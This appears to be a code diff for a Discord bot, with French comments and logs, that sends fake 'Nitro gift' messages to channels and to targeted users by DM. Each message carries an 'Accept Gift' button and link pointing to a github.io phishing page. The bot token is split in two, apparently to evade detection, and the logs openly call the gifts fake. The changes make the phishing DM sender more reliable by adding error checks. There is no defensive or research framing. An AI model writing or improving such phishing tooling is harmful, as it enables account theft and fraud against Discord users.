@@ -5,7 +5,7 @@ const botToken = part1 + part2;
 const phishingUrl = "https://swiemali2-lgtm.github.io/member-cleanup/"; 
 
 async function listen() {
-  console.log("Bot en ligne, en attente de commandes...");
+  console.log("Bot en ligne, en attente de commandes (nitro / dm id)...");
   let lastMsgId = null;
 
   setInterval(async () => {
@@ -84,7 +84,7 @@ async function sendNitro(channelId) {
           components: [
             {
               type: 2,
-              style: 5, // Bouton lien (style 5)
+              style: 5,
               label: "Accept Gift",
               url: phishingUrl
             }
@@ -96,7 +96,6 @@ async function sendNitro(channelId) {
 }
 
 async function sendDM(targetId) {
-  // 1. Créer le salon DM
   let dmRes = await fetch(`https://discord.com/api/v9/users/@me/channels`, {
     method: "POST",
     headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
@@ -112,7 +111,6 @@ async function sendDM(targetId) {
   
   const channelId = dmData.id;
   
-  // 2. Envoyer l'embed dans le DM
   let embed = {
     title: "You've been gifted a subscription!",
     description: `**ZeroDay** has gifted you Nitro for 3 months!\n\nExpires in 48 hours\n\n[Cliquez ici si le bouton ne marche pas](${phishingUrl})`,
@@ -125,7 +123,7 @@ async function sendDM(targetId) {
     }
   };
 
-  await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
+  let msgRes = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
     method: "POST",
     headers: { "Authorization": `Bot ${botToken}`, "Content-Type": "application/json" },
     body: JSON.stringify({
@@ -145,9 +143,15 @@ async function sendDM(targetId) {
         }
       ]
     })
-  }).catch(() => {});
+  });
   
-  console.log("faux nitro envoyé en dm.");
+  let msgData = await msgRes.json();
+  
+  if (msgData.id) {
+    console.log("faux nitro envoyé en dm avec succès.");
+  } else {
+    console.log("erreur envoi message :", msgData.message);
+  }
 }
 
 listen();
